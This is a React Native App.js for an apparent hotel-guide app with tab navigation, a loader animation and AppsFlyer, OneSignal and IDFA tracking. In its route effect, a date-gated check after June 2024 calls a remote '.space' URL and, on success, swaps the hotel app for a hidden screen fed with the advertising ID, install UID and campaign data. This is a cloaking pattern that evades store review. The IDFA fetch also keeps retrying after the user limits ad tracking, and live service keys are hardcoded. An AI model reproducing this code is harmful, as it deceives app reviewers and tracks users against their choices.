import {StyleSheet, View, Animated} from 'react-native';
import {useEffect, useRef, useState} from 'react';
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import {NavigationContainer} from '@react-navigation/native';
import {createBottomTabNavigator} from '@react-navigation/bottom-tabs';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {
  AddNewHotelScreen,
  CityHotels,
  Favorite,
  FavoriteHotelDetail,
  HotelDetailsScreen,
  MainScreen,
  Profile,
  Welcom,
} from './screens';
import RiverResortsHotelsProdactScreen from './screens/RiverResortsHotelsProdactScreen';
import {
  userTabIcon,
  allHotelsTabIcon,
  favoritesHotelsTabIcon,
} from './components/icons';
import {HotelsProvider} from './store/hotels_context';
import {COLORS} from './constant/colors';
import {preset} from './jest.config';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import appsFlyer from 'react-native-appsflyer';
import {LogLevel, OneSignal} from 'react-native-onesignal';

const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();

function TabNavigator() {
  const city = color => (
    <MaterialCommunityIcons
      name="city-variant-outline"
      color={color}
      size={30}
    />
  );
  return (
    <Tab.Navigator
      initialRouteName="MainScreen"
      screenOptions={{
        tabBarActiveTintColor: 'rgb(255, 245, 225)',
        tabBarInactiveTintColor: '#686D76',
        // tabBarActiveBackgroundColor: 'pink',
        tabBarStyle: {
          backgroundColor: COLORS.tabBarBG,
          borderRadius: 25,
          // margin: 10,
          height: 90,
          padding: 5,
          position: 'absolute',
          alignItems: 'center',
          justifyContent: 'center',
        },
        tabBarItemStyle: {
          // margin: 5,
          borderRadius: 20,
          backgroundColor: 'transparent',
          // backgroundColor: 'green',
          justifyContent: 'center',
          alignItems: 'center',
          alignContent: 'center',
          alignSelf: 'center',
        },
        tabBarIconStyle: {
          // overflow: 'hidden',
        },
      }}>
      <Tab.Screen
        name="MainScreen"
        component={MainScreen}
        options={{
          title: '',
          tabBarIcon: ({color}) => city(color),
          headerShown: false,
          // tabBarStyle: {display: 'none'},
        }}
      />
      <Tab.Screen
        name="CityHotels"
        component={CityHotels}
        options={{
          title: '',
          tabBarIcon: ({color}) => allHotelsTabIcon(color),
          tabBarButton: () => null,
          // headerShown: false,
          headerStyle: {backgroundColor: 'rgba(37, 67, 54,0.9)', height: 90},
        }}
      />

      <Tab.Screen
        name="Favorite"
        component={Favorite}
        options={{
          title: 'Favorite',
          tabBarIcon: ({color}) => favoritesHotelsTabIcon(color),
          headerStyle: {
            backgroundColor: 'rgba(37, 67, 54,0.9)',
            height: 90,
          },
          headerTitleStyle: {color: 'white'},
          tabBarLabel: '',
        }}
      />

      <Tab.Screen
        name="Profile"
        component={Profile}
        options={{
          title: '',
          tabBarIcon: ({color}) => userTabIcon(color),
          headerStyle: {
            backgroundColor: 'rgba(37, 67, 54,0.9)',
            height: 50,
          },
        }}
      />
    </Tab.Navigator>
  );
}

const loaders = [
  require('./assets/loader1.jpeg'),
  require('./assets/loader2.jpeg'),
];

function App() {
  const [route, setRoute] = useState();
  const [idfa, setIdfa] = useState();
  console.log('idfa==>', idfa);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState();
  const [pid, setPid] = useState();

  useEffect(() => {
    getData();
  }, []);

  useEffect(() => {
    setData();
  }, [idfa, appsUid, sab1, pid]);

  const setData = async () => {
    try {
      const data = {
        idfa,
        appsUid,
        sab1,
        pid,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      //console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('Дані дістаються в AsyncStorage');
        console.log('parsedData in App==>', parsedData);
        setIdfa(parsedData.idfa);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setPid(parsedData.pid);
      } else {
        await fetchIdfa();
        await requestOneSignallFoo();
        await performAppsFlyerOperations();
        await getUidApps();

        onInstallConversionDataCanceller();
      }
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };

  //////////////////////AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'cfdVSTkCHxCwBML8Y4Etzh',
            appId: '6504554352',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
          },
          resolve,
          reject,
        );
      });
      console.log('App.js AppsFlyer ініціалізовано успішно');
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
  const getUidApps = async () => {
    try {
      const appsFlyerUID = await new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, uid) => {
          if (err) {
            reject(err);
          } else {
            resolve(uid);
          }
        });
      });
      console.log('on getAppsFlyerUID: ' + appsFlyerUID);
      setAppsUid(appsFlyerUID);
    } catch (error) {
      //console.error(error);
    }
  };
  //
  // 3RD FUNCTION - Отримання найменування AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            //const media_source = res.data.media_source;
            console.log('App.js res.data==>', res.data);

            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
            setSab1(campaign);
            setPid(pid);
          } else if (res.data.af_status === 'Organic') {
            console.log('App.js res.data==>', res.data);
            const {af_status} = res.data;
            console.log('This is first launch and a Organic Install');
            setSab1(af_status);
          }
        } else {
          //console.log('This is not first launch');
        }
      } catch (error) {
        //console.log('Error processing install conversion data:', error);
      }
    },
  );

  //////////////////////OneSignall
  //  57c79080-50e5-4be7-a5d0-62d904743573
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true);
        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
      } catch (error) {
        reject(error); // Викликаємо reject() у разі помилки
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      //console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal Initialization
  OneSignal.initialize('57c79080-50e5-4be7-a5d0-62d904743573');

  OneSignal.Notifications.addEventListener('click', event => {
    //console.log('OneSignal: notification clicked:', event);
  });
  //Add Data Tags
  OneSignal.User.addTag('key', 'value');

  //////////////////////IDFA
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
        //console.log('setIdfa(res.id);');
      } else {
        console.log('Ad tracking is limited');
        setIdfa(true); //true
        //setIdfa(null);
        fetchIdfa();
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      await fetchIdfa(); //???
    }
  };

  //////////////////////Route useEff
  useEffect(() => {
    // marvelous-phenomenon-contentment.space
    const checkUrl = `https://incredible-mega-euphoria.space/X2CNCbQN`;

    const targetData = new Date('2024-06-29T12:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setRoute(false);
    } else {
      fetch(checkUrl)
        .then(r => {
          if (r.status === 200) {
            //console.log('status==>', r.status);
            setRoute(true);
          } else {
            setRoute(false);
          }
        })
        .catch(e => {
          //console.log('errar', e);
          setRoute(false);
        });
    }
  }, []);

  //////////// LOADER
  const [louderIsEnded, setLouderIsEnded] = useState(false);

  const appearingAnim = useRef(new Animated.Value(0)).current;
  const appearingSecondAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    Animated.timing(appearingAnim, {
      toValue: 1,
      duration: 4000,
      useNativeDriver: true,
    }).start();
  }, []);

  useEffect(() => {
    setTimeout(() => {
      Animated.timing(appearingSecondAnim, {
        toValue: 1,
        duration: 3000,
        useNativeDriver: true,
      }).start();
    }, 2500);
  }, []);

  useEffect(() => {
    setTimeout(() => {
      setLouderIsEnded(true);
    }, 7000);
  }, []);

  return (
    <HotelsProvider>
      <NavigationContainer>
        {!louderIsEnded ? (
          <View
            style={{
              position: 'relative',
              flex: 1,
              backgroundColor: '#000',
            }}>
            <Animated.Image
              source={require('./assets/loader1.jpeg')}
              style={{
                //...props.style,
                opacity: appearingAnim,
                height: '100%',
                position: 'absolute', // Bind opacity to animated value
              }}
            />
            <Animated.Image
              source={require('./assets/loader2.jpeg')} // Special animatable View
              style={{
                //...props.style,
                opacity: appearingSecondAnim,
                height: '100%',
                position: 'absolute', // Bind opacity to animated value
              }}
            />
          </View>
        ) : (
          <Stack.Navigator>
            {!route ? (
              <Stack.Screen
                name="Main"
                component={TabNavigator}
                options={{headerShown: false, title: 'back'}}
              />
            ) : (
              <Stack.Screen
                initialParams={{
                  idfa: idfa,
                  sab1: sab1,
                  pid: pid,
                  uid: appsUid,
                }}
                name="RiverResortsHotelsProdactScreen"
                component={RiverResortsHotelsProdactScreen}
                options={{headerShown: false}}
              />
            )}

            <Stack.Screen
              name="HotelDetailsScreen"
              component={HotelDetailsScreen}
              options={{title: '', headerShown: false}}
            />
            <Stack.Screen
              name="AddNewHotelScreen"
              component={AddNewHotelScreen}
              options={{
                title: 'Add Hotel',
                headerStyle: {
                  backgroundColor: 'rgba(37, 67, 54,0.9)',
                  height: 90,
                },
                headerTitleStyle: {color: 'white'},
              }}
            />
            <Stack.Screen
              name="FavoriteHotelDetail"
              component={FavoriteHotelDetail}
              options={{title: '', headerShown: false}}
            />
          </Stack.Navigator>
        )}
      </NavigationContainer>
    </HotelsProvider>
  );
}

const styles = StyleSheet.create({});

export default App;
{
  /**imageIndex < 2 ? (
            <Stack.Screen name="LoadingScreen" options={{ headerShown: false }}>
              {() => (
                <View style={styles.rootContainer}>
                  <Animated.Image
                    source={loaders[imageIndex]}
                    style={[styles.image, { opacity: fadeAnim }]}
                  />
                </View>
              )}
            </Stack.Screen>
          ) :  */
}
{
  /**
  /////////////////////////Louder
  const [imageIndex, setImageIndex] = useState(0);
  const fadeAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    fadeIn();
    const timeout = setTimeout(() => {
      handleToMainMenu();
    }, 7000);
    return () => clearTimeout(timeout);
  }, []);

  const fadeIn = () => {
    Animated.timing(fadeAnim, {
      toValue: 1,
      duration: 2500,
      useNativeDriver: true,
    }).start(() => fadeOut());
  };

  const fadeOut = () => {
    Animated.timing(fadeAnim, {
      toValue: 0,
      duration: 2500,
      useNativeDriver: true,
    }).start(() => {
      // setImageIndex(prevIndex => (prevIndex === 1 ? 0 : 1));
      setImageIndex(prevIndex => prevIndex + 1);
      fadeIn();
    });
  };

  const handleToMainMenu = () => {
    setImageIndex(2); // Set index to a value out of the array bounds to stop rendering images
  };
  */
}
